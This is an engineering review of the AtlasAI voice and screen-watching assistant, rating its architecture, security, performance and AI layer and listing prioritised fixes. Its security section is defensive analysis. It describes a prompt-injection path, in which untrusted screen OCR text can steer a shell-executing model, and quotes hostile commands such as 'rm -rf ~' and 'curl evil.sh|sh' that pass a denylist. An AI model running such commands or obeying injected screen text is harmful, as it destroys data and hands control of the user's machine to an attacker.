# AtlasAI — Full Engineering Review
> Principal-level production-readiness review, 2026-07-03. Method: full-repo survey + 4 parallel deep reviews (backend, frontend/Electron, AI/LLM layer, security/ops/testing), followed by direct verification of every Critical finding against source. Every Critical/High claim below was independently confirmed (file:line cited). Reviewed at working-tree state.

---

# Executive Summary

| Dimension | Score |
|---|---|
| **Overall Rating** | **4 / 10** |
| Production Readiness | 2 / 10 |
| Architecture | 6 / 10 |
| Code Quality | 5 / 10 |
| Security | 2 / 10 |
| Performance | 4 / 10 |
| Maintainability | 5 / 10 |
| Scalability | 3 / 10 |
| Testing | 3 / 10 |
| Documentation | 4 / 10 |

**The one-paragraph verdict:** AtlasAI is *idea-complete, integration-incomplete*. Individual modules are built to a standard well above typical junior work — a genuinely pure domain layer, a textbook async wake-word loop, thoughtful voice-latency engineering, correct secrets hygiene in git. But the parts were never final-assembled: the app **does not compile today** (`main.py:588` syntax error, verified with `py_compile`), the flagship voice feature is **wired to nothing** (DI factory has zero callers), the Electron desktop shell **exists only as untracked compiled output** (no source, no electron dependency, unbuildable from a clone), and the cloud deployment is an **unauthenticated public LLM proxy** that lets anyone on the internet burn your Anthropic credits. "85% MVP" (CLAUDE.md) is not accurate. This is closer to 60%, and the missing 40% is exactly the part interviews and production probe hardest.

**The four showstoppers:**
1. `backend/src/main.py:588` — stray `().atlas_mode}` fragment. `SyntaxError`. The backend cannot boot.
2. No authentication or rate limiting on any HTTP route or the WebSocket, deployed publicly via Railway with your API keys server-side.
3. RCE-by-screenshot: `run_terminal_command` executes arbitrary shell (`tool_executor.py:177`, `create_subprocess_shell`) behind a 7-regex denylist, while unsanitized screen OCR text flows into a system prompt that instructs the model "En caso de duda entre hablar y actuar: ACTÚA."
4. Electron main/preload source does not exist in the repo — only gitignored `dist-electron/` output. A fresh clone produces a web app, not the product.

---

# Architecture Review

**What's right.** The backend's clean-architecture layout is real, not cosplay: `domain/` has zero framework imports and dataclass entities with actual behavior (`assistant_state.py:55-151` is a proper guarded state machine); `application/interfaces/` defines ports; `infrastructure/database/repositories/` maps ORM↔domain explicitly with correct query patterns (`conversation_repository.py:203-216` uses subquery-then-reorder for last-N, with matching composite indexes in `models.py:176-190`). Dependency direction largely holds. This structure is a legitimate interview asset — *if* the violations below get fixed, because a reviewer who finds them will conclude the architecture is decorative.

**Where it breaks (severity, evidence, consequence, fix, interview-flag):**

- **[Critical] The DI container is built and then bypassed — three parallel wiring systems.** `AppContainer` exists (`container.py`), but module-level singletons `ws_manager` (`manager.py:771`) and `event_bus` (`event_bus.py:251`) live outside it, and `game.py:73` creates a *second* Claude adapter via `get_claude_adapter()` — a different instance from `container.claude`, plus a **new FishAudioAdapter per HTTP request** (`game.py:118`). Consequence: divergent config between two Claude instances, connection churn, untestable routes. Fix: container on `app.state`, access via `Depends`; delete the parallel singleton path. *Interview: yes — "you built a container and didn't use it" is a memorable rejection line.*

- **[Critical] The voice pipeline is unwired.** `container.py:148` `make_voice_use_case` has **zero callers** (verified by grep). `manager.py:178-204` setters (`set_voice_use_case_factory`, `set_whisper_service`, `set_tts_service`, `set_tool_executor`) are never invoked from lifespan or anywhere else. Every `audio_command` dead-ends at `manager.py:651-653` "No voice use case factory registered" — logged, not raised. The headline feature fails silently. Fix: 4 lines in lifespan after `container.initialize()`; better, constructor-inject. *Interview: yes — setter injection on singletons is exactly how wiring rots invisibly.*

- **[High] The `AIService` port is a fiction.** Interface declares 4 params (`ai_service.py:21-27`); `ClaudeAdapter.generate_response` takes 8; `generate_streaming_response` and `generate_proactive_help` aren't on the interface at all; `main.py:106` reaches through to `container.claude.client.messages.create` (raw SDK in the composition root). Swapping in the OpenAI adapter — the interface's stated purpose — would `TypeError` on the first call. Fix: widen the port to match reality (or a `GenerationRequest` dataclass) or delete the theater. *Interview: yes — LSP/ISP violation, prime senior material.*

- **[High] Cross-session state assumes exactly one user.** `main.py:348-351`: `_last_vision_call` and `_PROACTIVE_LAST_TRIGGER` are global dicts — one user's debounce throttles everyone. `manager.py:698-729`: `_screen_capture_loop` starts unconditionally per connection and MSS-captures **the server's screen** — on Railway it throws every 3s forever (swallowed at debug level). Memories have no user scoping — all clients share one memory pool. *Interview: yes — "what breaks when the second user connects?" This fails it.*

- **[Medium] Lifespan is a 490-line god function** (`main.py:45-538`) with four `handle_*` closures over globals — the container's docstring says it replaced this; it didn't. Move handlers to `application/handlers/` with explicit deps.

- **[Medium] Three overlapping screen-capture mechanisms** (per-session manager loop, global `screen_monitor_loop`, frontend-pushed frames) with error-keyword detection duplicated with drift (`main.py:378-396` vs `screen_monitor_loop.py:137-158` — different keyword lists). Pick one pipeline per deployment mode.

- **[Low] Repo contains an empty root `src/`, a stale duplicate root `tests/`, a committed `INFO/`, a 14-file `Skills/` tree, and a full `plugins/deep-plan/` plugin** — none of which are the application. Consequence: an interviewer's first impression is clutter. Move tooling out.

---

# Backend Review

- **[Critical] Doesn't compile.** `main.py:588` stray `().atlas_mode}`. Verified: `python -m py_compile` fails. Railway would crash-loop (`restartPolicyMaxRetries=3`) and stop. Fix: delete the line; add `python -m compileall src` to CI. *Interview: fatal — it means no CI, no pre-commit, no smoke test exists.*

- **[Critical] `mss` is hard-imported but absent from requirements.txt.** `manager.py:40` → `mss_capture_adapter.py:1` `import mss` (verified missing from requirements). Cloud deploy dies on import; works locally only because the venv was hand-fed. Same landmine: `openai_adapter.py` imports `openai`, also not in requirements (currently dead code). Fix: add `mss` (or lazy-import), delete the OpenAI adapter, build the Docker image in CI. *Interview: yes — "requirements.txt is your deployment contract."*

- **[Critical] SQLite on Railway's ephemeral filesystem, no Alembic.** `settings.py:223` + no volume in `railway.toml` + schema via `create_all` (`base.py:85`). Every redeploy wipes all conversations and memories; the first schema change breaks every existing DB with no upgrade path. Fix: Alembic now (4 tables — cheap), volume or Postgres. *Interview: yes — "how do you evolve the schema?" `create_all` is the wrong answer.*

- **[High] Chat blocks the WebSocket receive loop.** `manager.py:414` awaits `event_bus.emit` → handlers run inline (`event_bus.py:236-240`) → `handle_user_message` (`main.py:137-317`) streams the entire Claude response before the loop resumes. No ping/pong, no barge-in, no screen frames for 5–30s. The codebase *documents and fixes this exact bug for voice* (`manager.py:625-632`) and reintroduces it for text. Fix: `EventBus.emit` schedules handlers via `create_task` (tracked, with exception callbacks). *Interview: yes — core event-loop question, made worse by inconsistency.*

- **[High] Sync CPU-bound inference on the event loop.** `manager.py:548` calls ONNX wake-word detection directly in the receive loop; the same adapter is *correctly* dispatched via `run_in_executor` in `wake_word_loop.py:105-109`. Stalls every session under audio load.

- **[High] Fire-and-forget tasks, unreferenced.** `main.py:317` `ensure_future(_auto_extract_memory(...))` — no reference (GC footgun), no exception callback; `manager.py:245-247` tasks never cancelled on disconnect. Fix: per-session task set + cancel on disconnect.

- **[Medium] Duplicated 40-line persistence blocks** (`main.py:286-313` ≈ `voice_pipeline.py:353-388`) with divergent language defaults (`"en"` vs `"es"`; `models.py:32` says `"es"`, `session_manager.py:83` says `"en"`). Extract one `persist_exchange()`.

- **[Medium] WS protocol is stringly-typed.** Event names split between `EventType` enum and raw literals (`"ai_response_chunk"`, `"tts_audio"`, …); payload shapes inconsistently nested with fallback `.get` chains (`manager.py:505`); zero inbound validation. Fix: Pydantic envelope both directions.

- **[Medium] `POST /api/settings` can't work as designed.** Untyped `Dict` in, writes `.env` to CWD, then returns from an `@lru_cache`'d `get_settings()` that never sees the new values until restart (`routes/settings.py:48-85`, `settings.py:250`). Broken *and* dangerous (see Security).

- **[Medium] `/game/chat` labels MP3 bytes as `"wav"`** (`game.py:123` vs `:49,152`) — UE5 will fail to decode or play garbage; and returns raw exception text in 500s (`:157`).

- **[Medium] `datetime` chaos.** Deprecated naive `utcnow` in models/entities, local-time `now()` in events, hand-rolled `strftime` in main — DB and wire timestamps are on different clocks. Standardize `datetime.now(timezone.utc)`.

- **[Low] Dead code inventory:** `openai_adapter.py`, `AnalyzeScreenUseCase`, `OfferProactiveHelpUseCase` (bypassed by main.py), `tesseract_adapter.py`, `get_db_session` (never used), empty root `src/`. Delete ~1,500 lines.

**Good practice worth keeping (and saying why):** the repository pattern is textbook (port + explicit mapping + right indexes); `wake_word_loop.py` is the best file in the repo (thread-safe callback → queue → executor inference → graceful shutdown); graceful lifespan shutdown with `gather(return_exceptions=True)`; TypedDict result contracts on use cases.

**Stale-docs note (verified):** CLAUDE.md's "DB not wired" and "port 8000 vs 8001 mismatch" are both **no longer true** — persistence is wired end-to-end and every config agrees on 8000. Your own status docs cost this review an hour of chasing non-bugs. Fix the docs.

---

# Frontend Review

- **[Critical] The Electron layer has no source code.** No `src/main/`, no `src/preload/`, no `electron/` anywhere (verified). Only compiled `dist-electron/` exists — and `.gitignore:6` ignores it. `package.json` has **no `main` field, no `electron`/`electron-builder`/`vite-plugin-electron` dependency, and no script that launches Electron** (verified). STATUS.md still claims `frontend/src/main/index.ts` exists. Consequence: `git clone` → web app, not the product; lose this disk, lose the desktop shell. Fix: port the (readable) compiled JS back to TS source, add the deps and scripts, commit source, keep ignoring output. *Interview: fatal — "where does your app come from?" is question zero.*

- **[Critical] The renderer never calls `window.electronAPI` — the entire preload/IPC surface is dead.** Grep: zero matches in `src/`. 13 exposed methods (screen capture, resize, tray open-chat) — none consumed. The product pitch is "watches your screen"; the UI has no path to a screen pixel. Fix: typed `electronAPI` declaration + wire `captureScreenOnce()` into `chat_message.image_data` (backend field already exists, `App.tsx:326`).

- **[High] Wake-word audio pipeline drops ~57% of microphone audio.** `useAudioCapture.ts:264-348` polls an `AnalyserNode` every 100ms with `fftSize=2048` (≈42.7ms of audio at 48kHz) and decimates by nearest-neighbor (`data[Math.round(i*ratio)]`, line 339 — aliasing). Wake-word detection is flaky *by construction*. Fix: `AudioWorkletNode` (gapless 128-sample blocks), proper low-pass + decimate to 16kHz, binary WS frames instead of base64-in-JSON (~33% overhead). *Interview: yes — signal-processing correctness.*

- **[High] WS protocol untyped end-to-end; the one types file is unused and already wrong.** `types/events.ts` is imported nowhere, self-labeled "40% done", and contradicts live payloads in three places (`text` vs `chunk`; `audio_base64` vs `audio_b64`; `text` vs `message`). Service is `(data: any)` with `emit(data.type, data.data || data)` after bare `JSON.parse` (`services/websocket.ts:14,105-110`). `strict: true` is theater when the I/O boundary is `any`. Fix: finish the event map from real backend payloads, generic `on<K>()`, zod at the boundary. *Interview: yes — the #1 junior-vs-mid tell here.*

- **[High] API keys round-trip to the renderer in plaintext.** `SettingsPanel.tsx:39-42` GETs full keys into React state; masking is display-only; full object POSTed back (`:67`). Any XSS or eager error capture exfiltrates. Fix: backend returns masked + `is_set`; frontend sends only changed fields.

- **[High] Relative `/api/...` fetches only work under the Vite dev proxy.** In packaged Electron (`file://` origin) `fetch('/api/settings')` resolves to `file:///api/settings` and always fails; `App.tsx:72` uses absolute `API_BASE` for memories — two conventions, one broken. Fix: single `api.ts` with `apiFetch(path)`.

- **[High] No CSP; navigation logged instead of blocked; no `setWindowOpenHandler`; no `sandbox: true`; crash handler auto-reloads every 1.5s with no backoff** (compiled main). A warning emoji is not a security control. Fix in the recreated main source: `will-navigate` preventDefault, deny `window.open`, sandbox, strict CSP meta.

- **[High] `vercel.json` publishes a privileged desktop companion as a public SPA** that auto-starts mic capture on load (`useAudioCapture({autoStart:true})`, `App.tsx:134`) and falls back to `ws://localhost:8000`. Decide what this app is; delete vercel.json or build an explicit gated web target.

- **[Medium] App.tsx is a 480-line god component** with `as any` escape hatches (`state={assistantState as any}`, `role: 'tool_screenshot' as any`, screenshots smuggled as `'__screenshot__:'+b64` strings). Fix: `useChatMessages`/`useAssistantState`/`useMemories` hooks + discriminated-union `Message` type.

- **[Medium] Zustand is declared and never imported** — the actual state strategy is prop drilling. ~900 lines of dead components (`OrbCanvas.tsx` 408, stray `src/components/` tree 317, `ai-voice-input.tsx` 149). Delete.

- **[Medium] The 8-handler `useEffect` re-subscribes on every connect flap** (`App.tsx:158-299`, depends on `isConnected`) — streamed chunks can drop mid-message; `ping` every 10s with no `pong` handler (half a heartbeat). Reconnect gives up after 50 attempts and emits `reconnect_failed` — which nothing listens to; the UI is an 8px dot.

- **[Medium] Accessibility near-zero.** Icon-only buttons without `aria-label`, no `aria-live` for streaming/toasts, no focus trap or Escape on panels, blocking `confirm()` in an Electron renderer (`MemoryPanel.tsx:32`).

- **[Low]** ~90 ungated `console.log`s; toast `setTimeout` never cleared; hand-rolled regex markdown renderer (React-escaped so XSS-safe, but breaks on nested/unclosed constructs mid-stream — use `react-markdown`); typed "stop"/"para" messages silently swallowed, never sent (`App.tsx:313-319`).

**Good practice worth keeping:** the preload *design* (contextIsolation on, nodeIntegration off, contextBridge, cleanup-returning subscriptions) is textbook — it's just unused and unversioned; WS reconnect with capped backoff and a StrictMode-singleton decision *documented with the bug it fixed* (`useWebSocket.ts:402-408` — that comment is senior behavior); `useAudioCapture` resource hygiene; Sentry init-before-render with root ErrorBoundary and real fallback UI; strict tsconfig with noUnusedLocals.

---

# Database Review

- **[Critical]** SQLite + ephemeral filesystem + no migrations (covered above — the compound is what makes it Critical).
- **[High] Memory table has no user scoping, no dedup, no cap.** `_auto_extract_memory` inserts up to 3 rows per exchange with no uniqueness check; `get_all_memories()` is `SELECT * ORDER BY created_at DESC` with **no LIMIT** (`memory_repository.py:52-61`) and the full result is injected into every system prompt. Unbounded prompt growth + duplicate facts within days of real use.
- **[Medium]** `delete_all_memories` loads every row to delete them (`memory_repository.py:70-76`) — use a bulk `DELETE`.
- **[Medium]** Naive-datetime columns (see backend M-items) will bite the moment a timezone matters.
- **Good:** composite indexes match access patterns; correct last-N subquery; explicit ORM↔domain mapping isolates a future Postgres swap to a URL + driver change.

---

# Security Review

**Rating 2/10, and it's earned. The compound risk profile: an unauthenticated public LLM proxy whose model can execute shell commands, fed by attacker-controllable screen content.**

- **[Critical] Zero auth on everything, deployed publicly.** No `Depends`/`Security`/middleware on any router or the WebSocket (verified by grep — the only "api_key" matches are settings display code). `railway.toml` deploys to a public URL; keys live server-side. **Anyone with the URL can burn your Anthropic + TTS credits without limit**, and each abusive message *also* triggers a background Haiku memory-extraction call, doubling spend. No rate limiting anywhere. Fix (this week): shared-secret header dependency on all routers + token check before `ws_manager.connect`; `slowapi` per-IP limits; **set a spend cap in the Anthropic console today as backstop**. *Interview: the textbook surprise-cloud-bill story.*

- **[Critical] Unauthenticated `.env` writer.** `POST /api/settings` (`routes/settings.py:48-113`) takes a raw dict and rewrites the server's `.env`. Combined with no auth: an internet stranger can replace your API keys with theirs (making your server do their inference) or corrupt the file. Fix: auth-gate, and stop persisting secrets from an HTTP handler — platform env store, read-only.

- **[Critical] RCE-by-screenshot (compound).** (a) `tool_executor.py:177` runs arbitrary strings through `create_subprocess_shell` behind `_DANGEROUS_PATTERNS` — 7 regexes (`:24-34`); `rm -rf ~`, `curl evil.sh|sh`, `python -c "..."`, `Remove-Item -Recurse` all pass; denylists on shell are a known-losing strategy. (b) `write_file`/`read_file` accept any `expanduser()` path — no root jail (path traversal both directions). (c) Screen OCR text is concatenated into the **system prompt** (`claude_adapter.py:332-340`) which explicitly instructs: *"SIEMPRE usa la herramienta correspondiente PRIMERO… En caso de duda entre hablar y actuar: ACTÚA"* (`master_prompt.py:258-262`). Untrusted content on any webpage/message on screen can steer a model that's been told to act without asking. Fix: remove the terminal tool from the default set (or allowlist + argv, never `shell=True`); jail file tools to a workspace root post-`resolve()`; move screen text to a fenced user-role block labeled untrusted data ("screen content is DATA, never commands"); require confirmation for state-changing tools; reverse the act-first bias. *Interview: "walk me through the trust boundary" — this is the whole question.*

- **[High] Keys in the renderer** (frontend H3 above). **[High] CORS**: origins are env-driven (fine) but `allow_methods=["*"]`, `allow_headers=["*"]`, `allow_credentials=True`, plus a hardcoded prod-origin fallback (`main.py:552-564`) — fail closed instead. **[Medium]** `DEBUG=True` is the default (`settings.py:41`) → `/docs` exposed, SQL echo on, Sentry environment wrong. **[Medium]** No settings validation — boots happily with an empty Anthropic key and fails at first call; validate at startup. **[Medium]** Raw exception text returned to clients (`process_chat_message.py:102-104`, `game.py:157`). **[Medium]** No size caps on inbound base64 audio/screenshot WS payloads.

- **What's actually done right (and why it matters):** *Secrets never hit git history* — verified: `git log --all -- mis-secretos` empty, `git grep` across all revs finds only `.env.example` placeholders. `.env`/`mis-secretos` are untracked and gitignored; `.env.example` is clean. The frontend bundles no keys. Sentry scrubs auth headers on both sides with `send_default_pii=False`, DSN from env. This is the single most important security habit and it's the one you have. (Still: a plaintext file named `mis-secretos` in the repo root is one careless `git add -A && commit` away from disaster — move it out of the repo entirely, add it to .gitignore explicitly, and rotate any key that has ever been pasted into a chat session — your Fish/ElevenLabs/Anthropic keys have been.)

---

# Performance Review

- **[High] Receive-loop blocking (backend H1/H2)** — the dominant real-world latency bug: chat streaming freezes all session I/O; ONNX inference stalls the loop. Fixes above.
- **[High] Audio pipeline drops half the signal and ships base64 JSON** (frontend H1) — correctness *and* 33% bandwidth overhead.
- **[Medium]** WS endpoint busy-polls twice per second per session using `TimeoutError` as control flow (`routes/websocket.py:51-61`, `manager.py:316`) — run the receive loop in the endpoint coroutine and let `WebSocketDisconnect` propagate.
- **[Medium]** Multi-MB base64 screenshots stored inside React `messages` state re-serialize through every update; message rows unmemoized.
- **[Medium]** Loads 20 messages from DB, slices to 10 in the adapter — wasted read (and see AI review for the policy problem).
- **Good:** sentence-level parallel TTS with ordered delivery; per-frame vision-analysis caching so three service methods share one API call; fast-route deterministic voice commands that skip the LLM entirely.

---

# AI/LLM Review

- **[Critical] No cost controls anywhere** (verified: zero budget/cap logic in repo). Screen-monitor loop ships a full 1080p JPEG to Haiku vision at `settings.screen_capture_interval = 3` seconds (`settings.py:58`, loop default 10s is overridden). ≈1,200 vision calls/hour ≈ **$1.80–2.50/hour idle**, per session, forever — $15–50/day for one always-on user, *plus* a Sonnet proactive-help call every time the literal substring "error" appears on screen (`screen_monitor_loop.py:33-43` — reading a blog post about errors bills you). Fix in order: perceptual-diff/hash consecutive frames (idle screens → $0), hard daily token budget with kill switch, downscale to ~1024px, back off when idle. *Interview: "estimate the monthly bill" — you need this number before anyone else asks it.*

- **[Critical] Prompt injection surface** (covered in Security — it's the same finding; the AI-layer fix is fencing screen text as untrusted data and removing the act-first instruction for observed content).

- **[High] Provider abstraction isn't one.** Interface/adapter mismatch (backend H5), streaming and proactive methods Claude-only, `openai_adapter.py` dead + non-conformant + missing dep, container only ever builds Claude. Commit to Claude and delete, or make the port real. Right now it's a file that costs credibility.

- **[High] Memory is a naive dump with a poisoning path.** Every extracted "fact" — including facts derived from screen-injected text — is stored forever, unscoped, undeduplicated, and re-injected into *every* future system prompt via a LIMIT-less `SELECT *`. CLAUDE.md claims embeddings/RAG; **none exists** (verified). Fix: top-K with LIMIT, content-hash dedup, never auto-store screen-derived text, relevance (keyword first, embeddings when data justifies it).

- **[High] Retries/timeouts inconsistent.** One retry helper exists (`claude_adapter.py:264-278`) but matches on the *string* "overloaded", silently returns `None` on exhaustion, and is used only in the tool loop — streaming, vision, proactive, memory calls are raw with no timeout. Fix: one type-aware retry+timeout wrapper (or the SDK's `max_retries`) on every call.

- **[High] Context policy diverges by entry path.** DB loads 20, adapters slice `[-10:]`; text chat (streaming) has **no tool support** while voice does — users get different capabilities depending on whether they typed or spoke. Hard truncation, no summarization. Unify.

- **[Medium]** JSON-from-LLM parsed with `json.loads` + backtick stripping, no structured-output/tool-use mode, no schema validation — a prose preamble silently degrades vision analysis to "no error". **[Medium]** TTS "fallback chain" is boot-time either/or, not a chain; `edge_tts_adapter.py` (free) is never instantiated. **[Medium]** Whole-screen frames go to a cloud API with no sensitive-app pause, no redaction, no visible indicator. **[Low]** Model IDs mixed (undated `claude-sonnet-4-6` vs dated Haiku pin); `default_max_tokens=1024` truncates long coding answers; Playwright `--no-sandbox` + headful.

- **Good practice (real engineering, keep it):** dedicated `ProactorEventLoop` thread bridging Playwright on Windows/Py3.13 (`playwright_adapter.py:37-73`) — hard problem, solved correctly; Whisper `VAD + temperature=0 + condition_on_previous_text=False` kills the classic silence-hallucination; per-frame vision caching; Haiku-for-volume/Sonnet-for-reasoning split is the right cost instinct; mock client enables offline CI; multi-block-safe response text extraction.

---

# Code Smells

Stringly-typed protocol both sides; `as any` at every hard boundary; magic string `api_key == "mock"`; `'__screenshot__:'+b64` content smuggling; bilingual comments and logs mixed mid-file; emoji logging; two `.get()` fallback shapes for the same payload; setter-injection half-configured singletons; dead interface + dead adapter + dead use cases + ~900 lines of dead React components + dead zustand dep; duplicated persistence and error-keyword blocks; `datetime` in three inconsistent flavors; `TimeoutError` as control flow; test caches and logs in the working tree; a file named `mis-secretos` in the repo root.

# Design Pattern Review

**Used well:** Repository (properly, with ports), State machine (AssistantState), Adapter (voice/vision — genuine third-party isolation), Producer-consumer (wake-word loop), Circuit-breaker-ish degradation in TTS fallback to browser speech. **Used in name only:** Dependency Injection (container bypassed), Ports & Adapters for AI (interface fiction), Event bus (synchronous inline dispatch — it's a function call with extra steps; if handlers must not block the emitter, that's the *point* of a bus). **Missing where needed:** Unit-of-work around multi-write persistence; Strategy for TTS chain; any form of Builder/factory for prompt assembly (master_prompt is 4 hand-maintained bilingual variants with drift, including a stale "Claude 3.5 Sonnet" docstring).

# Technical Debt

Ranked by carrying cost: (1) untyped WS protocol — every feature pays the drift tax (three live payload mismatches already); (2) no CI/pre-commit — a syntax error reached the tree, proof the gate is absent; (3) doc drift — CLAUDE.md/STATUS.md contain at least three verified falsehoods (DB, ports, RAG), which poisons every future AI-assisted session that reads them as ground truth; (4) dead code inventory (~2,400 lines across both stacks) inflating every review and every context window; (5) bilingual duplication in prompts/logs; (6) repo clutter (Skills/, plugins/, INFO/, empty src/, duplicate tests/) — move tooling to a dotfiles/tooling repo.

---

# Top 20 Highest Priority Improvements

1. **Delete `main.py:588`; app compiles again.** 5 minutes. Everything else is gated on this.
2. **Add CI:** `python -m compileall src` + `pytest` + `tsc --noEmit` + Docker build on every push. This class of failure becomes impossible.
3. **Auth + rate limiting on every route and the WS; Anthropic spend cap in console today.** Until then the Railway deploy is a donation box for strangers.
4. **Neutralize the terminal tool: allowlist + argv (no `shell=True`), jail file tools to a workspace root, confirmation gate on state-changing tools.**
5. **Fence screen/OCR text as untrusted data in a user-role block; remove the "act first" instruction for observed content.**
6. **Recreate Electron main/preload TS source in-repo** (port from compiled output), add `electron`/`electron-builder`/`vite-plugin-electron` + `main` field + scripts. Half a day; makes the product buildable from a clone.
7. **Wire the container into `ws_manager` in lifespan (4 calls)** and add one integration test: open WS, send `audio_command`, assert a non-"factory missing" path. Restores the flagship feature.
8. **Add `mss` to requirements; delete `openai_adapter.py`;** `pip check` in CI.
9. **Frame-diff the screen-monitor loop + hard daily token budget + kill switch.** Idle screens should cost $0.
10. **Alembic + Railway volume (or Postgres).** User data must survive a deploy.
11. **Make `EventBus.emit` non-blocking** (tracked create_task per handler) — unfreezes chat streaming; move ONNX detection to executor in `manager.py:548`.
12. **Type the WS protocol end-to-end:** finish `events.ts` from real payloads, generic `on<K>()`, zod inbound, Pydantic inbound on backend, kill the enum/literal split.
13. **Settings security:** masked keys + `is_set` from backend, write-only diffs from frontend, no `.env` writes from HTTP handlers, `get_settings.cache_clear()` or runtime config object.
14. **Fix the audio path:** AudioWorklet gapless capture, real 16kHz resample, binary frames. Wake word goes from flaky to dependable.
15. **Memory hygiene:** LIMIT + top-K injection, content-hash dedup, user scoping, never store screen-derived text. Update CLAUDE.md to stop claiming RAG.
16. **One retry/timeout wrapper on all Anthropic calls;** unify context window policy and tool availability across text/voice.
17. **Kill dead code (~2,400 lines) + repo clutter** (Skills/, plugins/, INFO/, empty src/, duplicate tests/, zustand, OrbCanvas, stray component tree, vercel.json — or make the web target explicit and gated).
18. **Split App.tsx** into `useChatMessages`/`useAssistantState`/`useMemories`; discriminated-union Message type; delete every `as any`.
19. **Electron hardening in the rebuilt main:** block `will-navigate`, deny `window.open`, `sandbox: true`, CSP meta, crash-reload backoff.
20. **Update CLAUDE.md/STATUS.md to match verified reality** (DB wired, ports fine, no RAG, Electron source missing) — your status docs currently mislead both humans and every AI session that reads them.

---

# If This Were My Team

I would not approve this for production, and I'd block the *demo* until items 1–5 land. Here's the exact bar:

**Before anyone sees a URL (this week):** compile fix + CI gate; auth + rate limit + spend cap; terminal tool removed from the reachable toolset; screen text fenced as data. These four close "stranger drains your wallet" and "webpage owns your laptop." None of them takes longer than a day.

**Before calling it an MVP (next 2–3 weeks):** Electron source restored and buildable from clone; voice pipeline actually wired with one integration test proving it; `mss` in requirements + Docker build in CI; Alembic + durable storage; frame-diff + budget on the vision loop. At that point "85% MVP" becomes true instead of aspirational.

**Before I'd let you show it in a senior interview:** typed WS protocol, App.tsx decomposition, dead-code purge, honest status docs. Interviewers read repos the way this review did — the dead interface, the unused container, and the `as any`s tell them more than the architecture diagram does.

The honest summary, Ricky: your ceiling is visibly high — the domain layer, the wake-word loop, the Playwright bridge, and the git-secrets hygiene are things plenty of mid-level engineers get wrong. Your floor is the problem: nothing here proves the system *works as a whole*, because nothing checks. Every Critical in this review — the syntax error, the unwired voice path, the missing dependency, the missing Electron source — is the same root cause wearing four costumes: **no integration gate between "I wrote it" and "it runs."** One `pytest` smoke test that boots the app and one CI file would have caught all four. Build the gate first; then finish the assembly. That's the difference between 85% claimed and 85% real.
